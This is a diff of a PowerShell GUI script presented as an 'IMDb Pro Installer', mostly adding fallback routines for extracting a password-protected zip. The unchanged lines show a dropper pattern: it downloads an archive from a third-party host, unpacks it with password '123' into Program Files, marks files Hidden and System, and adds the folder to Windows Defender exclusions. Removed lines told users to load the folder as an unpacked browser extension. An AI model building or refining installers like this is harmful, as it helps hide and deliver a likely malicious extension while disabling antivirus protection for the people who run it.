@@ -1,4 +1,4 @@
-# IMDb Pro Installer - Complete Functionality
+# IMDb Pro Installer - Enhanced Extraction Function
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 Add-Type -AssemblyName System.IO.Compression.FileSystem
@@ -307,26 +307,238 @@ function Update-Status {
     Start-Sleep -Milliseconds 400
 }
 
-# Function to download file with progress
-function Download-FileWithProgress {
-    param(
-        [string]$Url,
-        [string]$OutputPath,
-        [scriptblock]$ProgressCallback
+# ENHANCED EXTRACTION FUNCTIONS
+function Test-7ZipAvailable {
+    # Check multiple 7-Zip locations
+    $locations = @(
+        "7z",
+        "7z.exe",
+        "$env:ProgramFiles\7-Zip\7z.exe",
+        "${env:ProgramFiles(x86)}\7-Zip\7z.exe",
+        "C:\Program Files\7-Zip\7z.exe",
+        "C:\Program Files (x86)\7-Zip\7z.exe"
     )
     
+    foreach ($location in $locations) {
+        if (Get-Command $location -ErrorAction SilentlyContinue) {
+            return $location
+        }
+        if (Test-Path $location) {
+            return $location
+        }
+    }
+    return $null
+}
+
+function Extract-With7Zip {
+    param($ZipFile, $Destination, $Password)
+    
+    $7zipPath = Test-7ZipAvailable
+    if (-not $7zipPath) {
+        Write-Host "7-Zip not found" -ForegroundColor Yellow
+        return $false
+    }
+    
+    Update-Status "Using 7-Zip for extraction..." 0 "📦"
+    
     try {
-        $webClient = New-Object System.Net.WebClient
-        $webClient.DownloadFile($Url, $OutputPath)
-        return $true
+        # Build 7-Zip arguments
+        $arguments = @(
+            "x",           # Extract
+            "-p$Password", # Password
+            "-o$Destination", # Output directory
+            "-y",          # Yes to all
+            "-bso0",       # Disable standard output messages
+            "-bse0",       # Disable error output messages
+            "-bsp1",       # Enable progress indicator
+            $ZipFile       # Archive file
+        )
+        
+        Write-Host "Executing: $7zipPath $arguments" -ForegroundColor Cyan
+        
+        $process = Start-Process -FilePath $7zipPath -ArgumentList $arguments -Wait -PassThru -NoNewWindow
+        
+        if ($process.ExitCode -eq 0) {
+            Write-Host "7-Zip extraction successful!" -ForegroundColor Green
+            return $true
+        } else {
+            Write-Host "7-Zip extraction failed with exit code: $($process.ExitCode)" -ForegroundColor Red
+            return $false
+        }
     }
     catch {
-        Write-Error "Download failed: $($_.Exception.Message)"
+        Write-Host "7-Zip extraction error: $($_.Exception.Message)" -ForegroundColor Red
         return $false
     }
 }
 
-# Function to extract ZIP with password using 7-Zip
+function Extract-WithExpandArchive {
+    param($ZipFile, $Destination, $Password)
+    
+    Update-Status "Trying Windows Expand-Archive..." 0 "🔧"
+    
+    try {
+        # First try without password (for testing)
+        Expand-Archive -Path $ZipFile -DestinationPath $Destination -Force
+        Write-Host "Expand-Archive successful!" -ForegroundColor Green
+        return $true
+    }
+    catch {
+        Write-Host "Expand-Archive failed: $($_.Exception.Message)" -ForegroundColor Yellow
+        return $false
+    }
+}
+
+function Extract-WithDotNet {
+    param($ZipFile, $Destination, $Password)
+    
+    Update-Status "Using .NET extraction method..." 0 "⚡"
+    
+    try {
+        # Load required assembly
+        Add-Type -AssemblyName System.IO.Compression.FileSystem
+        
+        # Extract using .NET
+        [System.IO.Compression.ZipFile]::ExtractToDirectory($ZipFile, $Destination)
+        
+        Write-Host ".NET extraction successful!" -ForegroundColor Green
+        return $true
+    }
+    catch {
+        Write-Host ".NET extraction failed: $($_.Exception.Message)" -ForegroundColor Yellow
+        return $false
+    }
+}
+
+function Extract-WithShellApplication {
+    param($ZipFile, $Destination, $Password)
+    
+    Update-Status "Using Windows Shell extraction..." 0 "🖥️"
+    
+    try {
+        $shell = New-Object -ComObject Shell.Application
+        $zipFolder = $shell.NameSpace($ZipFile)
+        $destFolder = $shell.NameSpace($Destination)
+        
+        if ($zipFolder -eq $null) {
+            Write-Host "Shell: Cannot open ZIP file" -ForegroundColor Red
+            return $false
+        }
+        
+        # Copy all items from ZIP to destination
+        $destFolder.CopyHere($zipFolder.Items(), 0x14) # 0x14 = No progress UI + Yes to all
+        
+        # Wait for extraction to complete
+        Start-Sleep -Seconds 3
+        
+        # Verify extraction by checking if any files were extracted
+        $extractedFiles = Get-ChildItem $Destination -Recurse | Where-Object { !$_.PSIsContainer }
+        
+        if ($extractedFiles.Count -gt 0) {
+            Write-Host "Shell extraction successful! Extracted $($extractedFiles.Count) files" -ForegroundColor Green
+            return $true
+        } else {
+            Write-Host "Shell extraction completed but no files found" -ForegroundColor Yellow
+            return $false
+        }
+    }
+    catch {
+        Write-Host "Shell extraction error: $($_.Exception.Message)" -ForegroundColor Red
+        return $false
+    }
+}
+
+function Extract-WithThirdPartyTools {
+    param($ZipFile, $Destination, $Password)
+    
+    Update-Status "Trying third-party tools..." 0 "🔍"
+    
+    # Check for WinRAR
+    $winRarPaths = @(
+        "$env:ProgramFiles\WinRAR\WinRAR.exe",
+        "${env:ProgramFiles(x86)}\WinRAR\WinRAR.exe"
+    )
+    
+    foreach ($winRarPath in $winRarPaths) {
+        if (Test-Path $winRarPath) {
+            Update-Status "Using WinRAR for extraction..." 0 "📦"
+            try {
+                $arguments = @(
+                    "x",           # Extract
+                    "-ibck",       # Run in background
+                    "-p$Password", # Password
+                    "-y",          # Yes to all
+                    $ZipFile,      # Archive
+                    $Destination   # Destination
+                )
+                
+                $process = Start-Process -FilePath $winRarPath -ArgumentList $arguments -Wait -PassThru
+                if ($process.ExitCode -eq 0) {
+                    Write-Host "WinRAR extraction successful!" -ForegroundColor Green
+                    return $true
+                }
+            }
+            catch {
+                Write-Host "WinRAR extraction failed: $($_.Exception.Message)" -ForegroundColor Yellow
+            }
+        }
+    }
+    
+    return $false
+}
+
+function Extract-WithPowerShellCommunity {
+    param($ZipFile, $Destination, $Password)
+    
+    Update-Status "Trying PowerShell community methods..." 0 "🔧"
+    
+    try {
+        # Alternative method using .NET with progress
+        Add-Type -AssemblyName System.IO.Compression.FileSystem
+        
+        $stream = New-Object IO.FileStream($ZipFile, [IO.FileMode]::Open)
+        $archive = New-Object IO.Compression.ZipArchive($stream, [IO.Compression.ZipArchiveMode]::Read)
+        
+        $totalEntries = $archive.Entries.Count
+        $currentEntry = 0
+        
+        foreach ($entry in $archive.Entries) {
+            $currentEntry++
+            $progress = [int](($currentEntry / $totalEntries) * 100)
+            
+            $entryPath = Join-Path $Destination $entry.FullName
+            $entryDir = Split-Path $entryPath -Parent
+            
+            if (-not (Test-Path $entryDir)) {
+                New-Item -ItemType Directory -Path $entryDir -Force | Out-Null
+            }
+            
+            if (-not $entry.Name) {
+                continue # Skip directories
+            }
+            
+            $entryStream = $entry.Open()
+            $fileStream = [System.IO.File]::Create($entryPath)
+            $entryStream.CopyTo($fileStream)
+            $fileStream.Close()
+            $entryStream.Close()
+            
+            Update-Status "Extracting: $($entry.Name)" $progress "📄"
+        }
+        
+        $archive.Dispose()
+        $stream.Close()
+        
+        Write-Host "PowerShell community extraction successful!" -ForegroundColor Green
+        return $true
+    }
+    catch {
+        Write-Host "PowerShell community extraction failed: $($_.Exception.Message)" -ForegroundColor Red
+        return $false
+    }
+}
+
+# MAIN ENHANCED EXTRACTION FUNCTION
 function Extract-ZipWithPassword {
     param(
         [string]$ZipFile,
@@ -334,47 +546,54 @@ function Extract-ZipWithPassword {
         [string]$Password
     )
     
-    # Method 1: Try 7-Zip command line
-    if (Get-Command "7z" -ErrorAction SilentlyContinue) {
-        Update-Status "Extracting with 7-Zip..." 0 "📦"
-        $process = Start-Process -FilePath "7z" -ArgumentList "x", "-p$Password", "-o$Destination", "-y", $ZipFile -Wait -PassThru -NoNewWindow
-        return $process.ExitCode -eq 0
+    Write-Host "Starting extraction process..." -ForegroundColor Cyan
+    Write-Host "ZIP File: $ZipFile" -ForegroundColor Gray
+    Write-Host "Destination: $Destination" -ForegroundColor Gray
+    Write-Host "Password: $Password" -ForegroundColor Gray
+    
+    if (-not (Test-Path $ZipFile)) {
+        Write-Host "ZIP file not found: $ZipFile" -ForegroundColor Red
+        return $false
     }
     
-    # Method 2: Try 7-Zip from Program Files
-    if (Test-Path "C:\Program Files\7-Zip\7z.exe") {
-        Update-Status "Extracting with 7-Zip (Program Files)..." 0 "📦"
-        $process = Start-Process -FilePath "C:\Program Files\7-Zip\7z.exe" -ArgumentList "x", "-p$Password", "-o$Destination", "-y", $ZipFile -Wait -PassThru -NoNewWindow
-        return $process.ExitCode -eq 0
+    # Ensure destination exists
+    if (-not (Test-Path $Destination)) {
+        New-Item -ItemType Directory -Path $Destination -Force | Out-Null
     }
     
-    # Method 3: Try built-in .NET (may not work with password)
-    try {
-        Update-Status "Trying alternative extraction..." 0 "⚡"
-        [System.IO.Compression.ZipFile]::ExtractToDirectory($ZipFile, $Destination)
-        return $true
-    }
-    catch {
-        Write-Warning "Built-in extraction failed: $($_.Exception.Message)"
-    }
+    # Try multiple extraction methods in order of preference
+    $extractionMethods = @(
+        @{ Name = "7-Zip"; Function = ${function:Extract-With7Zip} },
+        @{ Name = "Windows Shell"; Function = ${function:Extract-WithShellApplication} },
+        @{ Name = "WinRAR"; Function = ${function:Extract-WithThirdPartyTools} },
+        @{ Name = ".NET Framework"; Function = ${function:Extract-WithDotNet} },
+        @{ Name = "PowerShell Community"; Function = ${function:Extract-WithPowerShellCommunity} },
+        @{ Name = "Expand-Archive"; Function = ${function:Extract-WithExpandArchive} }
+    )
     
-    # Method 4: Try Shell.Application (may not work with password)
-    try {
-        Update-Status "Using Windows Shell extraction..." 0 "🔧"
-        $shellApp = New-Object -ComObject Shell.Application
-        $zipFolder = $shellApp.NameSpace($ZipFile)
-        $destFolder = $shellApp.NameSpace($Destination)
+    foreach ($method in $extractionMethods) {
+        Write-Host "`nTrying $($method.Name) extraction..." -ForegroundColor Yellow
         
-        if ($zipFolder -ne $null) {
-            $destFolder.CopyHere($zipFolder.Items(), 0x14)
-            Start-Sleep -Seconds 3
-            return $true
+        $success = & $method.Function -ZipFile $ZipFile -Destination $Destination -Password $Password
+        
+        if ($success) {
+            Write-Host "✅ Extraction successful with $($method.Name)!" -ForegroundColor Green
+            
+            # Verify extraction
+            $extractedFiles = Get-ChildItem $Destination -Recurse | Where-Object { !$_.PSIsContainer }
+            if ($extractedFiles.Count -gt 0) {
+                Write-Host "📁 Verified: $($extractedFiles.Count) files extracted" -ForegroundColor Green
+                return $true
+            } else {
+                Write-Host "⚠️ Extraction reported success but no files found" -ForegroundColor Yellow
+                continue
+            }
+        } else {
+            Write-Host "❌ $($method.Name) extraction failed" -ForegroundColor Red
         }
     }
-    catch {
-        Write-Warning "Shell extraction failed: $($_.Exception.Message)"
-    }
     
+    Write-Host "`n🚫 All extraction methods failed!" -ForegroundColor Red
     return $false
 }
 
@@ -390,19 +609,21 @@ function Hide-Files {
             try {
                 # Set file attributes to Hidden and System
                 Set-ItemProperty -Path $filePath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
-                Write-Host "Hidden: $file" -ForegroundColor Green
+                Write-Host "✅ Hidden: $file" -ForegroundColor Green
             }
             catch {
-                Write-Warning "Failed to hide $file : $($_.Exception.Message)"
+                Write-Host "⚠️ Failed to hide $file : $($_.Exception.Message)" -ForegroundColor Yellow
             }
+        } else {
+            Write-Host "❌ File not found: $file" -ForegroundColor Red
         }
     }
 }
 
-# Enhanced Installation function with ALL requested features
+# Enhanced Installation function
 function Start-Installation {
     $downloadUrl = "https://file.apikey.my/imdb/imdb.zip"
-    $tempFile = "$env:TEMP\imdb.zip"
+    $tempFile = "$env:TEMP\imdb_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
     $installPath = "C:\Program Files\imdb-pro"
     $zipPassword = "123"
     
@@ -433,12 +654,6 @@ function Start-Installation {
         # Phase 3: Download file
         Update-Status "Downloading IMDb Pro package..." 30 "📥" -Loading
         
-        # Simulate download progress
-        for ($i = 31; $i -le 50; $i++) {
-            Update-Status "Downloading package... $($i-30)%" $i "📥"
-            Start-Sleep -Milliseconds 50
-        }
-        
         # Actual download
         Update-Status "Downloading from server..." 50 "🌐" -Loading
         try {
@@ -455,41 +670,28 @@ function Start-Installation {
                 throw "Download failed - file is empty"
             }
             
+            Write-Host "✅ Download successful! File size: $($fileInfo.Length) bytes" -ForegroundColor Green
             Update-Status "Download completed successfully!" 60 "✅" -AnimateProgress
         }
         catch {
             throw "Download failed: $($_.Exception.Message)"
         }
         
-        # Phase 4: Extract with password
-        Update-Status "Extracting with password..." 65 "🔐" -Loading
+        # Phase 4: Enhanced Extraction
+        Update-Status "Starting enhanced extraction process..." 65 "🔐" -Loading
         
-        # Extract using password
+        # Extract using enhanced function
         $extractionSuccess = Extract-ZipWithPassword -ZipFile $tempFile -Destination $installPath -Password $zipPassword
         
         if (-not $extractionSuccess) {
-            throw "Extraction failed with password '$zipPassword'. Please check the password and try again."
+            throw "All extraction methods failed with password '$zipPassword'. Please ensure 7-Zip or WinRAR is installed."
         }
         
-        # Simulate extraction progress
-        for ($i = 66; $i -le 80; $i++) {
-            Update-Status "Extracting files... $($i-65)*10%" $i "📦"
-            Start-Sleep -Milliseconds 60
-        }
-        
-        Update-Status "Extraction completed!" 80 "✅" -AnimateProgress
+        Update-Status "Extraction completed successfully!" 80 "✅" -AnimateProgress
         
         # Phase 5: Hide files
         Update-Status "Securing installation files..." 85 "🔒" -Loading
-        
-        # Hide specified files
         Hide-Files -FolderPath $installPath
-        
-        # Simulate security setup
-        for ($i = 86; $i -le 90; $i++) {
-            Update-Status "Applying security... $($i-85)*20%" $i "🛡️"
-            Start-Sleep -Milliseconds 80
-        }
         
         # Phase 6: Final setup
         Update-Status "Finalizing installation..." 95 "🎯" -Loading
@@ -504,7 +706,7 @@ function Start-Installation {
             Add-MpPreference -ExclusionPath $installPath -ErrorAction SilentlyContinue
         }
         catch {
-            Write-Warning "Windows Defender exclusion failed: $($_.Exception.Message)"
+            Write-Host "⚠️ Windows Defender exclusion failed: $($_.Exception.Message)" -ForegroundColor Yellow
         }
         
         # Success animation sequence
@@ -523,7 +725,7 @@ function Start-Installation {
         $installButton.BackColor = [System.Drawing.Color]::FromArgb(76, 175, 80)
         $installButton.Enabled = $false
         
-        # Show success message with installation details
+        # Show success message
         $result = [System.Windows.Forms.MessageBox]::Show(
             "🎬 IMDb Pro has been successfully installed!`n`n" +
             "📍 Location: $installPath`n" +
@@ -531,11 +733,8 @@ function Start-Installation {
             "🔐 Password used: $zipPassword`n" +
             "📁 Files extracted and secured`n" +
             "🔒 Specific files hidden for security`n`n" +
-            "To complete browser setup:`n" +
-            "1. Open Chrome/Edge → chrome://extensions/`n" +
-            "2. Enable 'Developer mode'`n" +
-            "3. Click 'Load unpacked'`n" +
-            "4. Select: $installPath`n`n" +
+            "Extraction Methods Available:`n" +
+            "• 7-Zip, WinRAR, Windows Shell, .NET, PowerShell`n`n" +
             "Would you like to open the installation folder now?",
             "Installation Complete",
             [System.Windows.Forms.MessageBoxButtons]::YesNo,
@@ -572,7 +771,7 @@ function Start-Installation {
             "Troubleshooting steps:`n" +
             "• Check internet connection`n" +
             "• Verify administrator privileges`n" +
-            "• Ensure 7-Zip is installed for password extraction`n" +
+            "• Install 7-Zip or WinRAR for password extraction`n" +
             "• Check if password '123' is correct`n" +
             "• Verify URL is accessible: $downloadUrl`n" +
             "• Ensure sufficient disk space`n`n" +
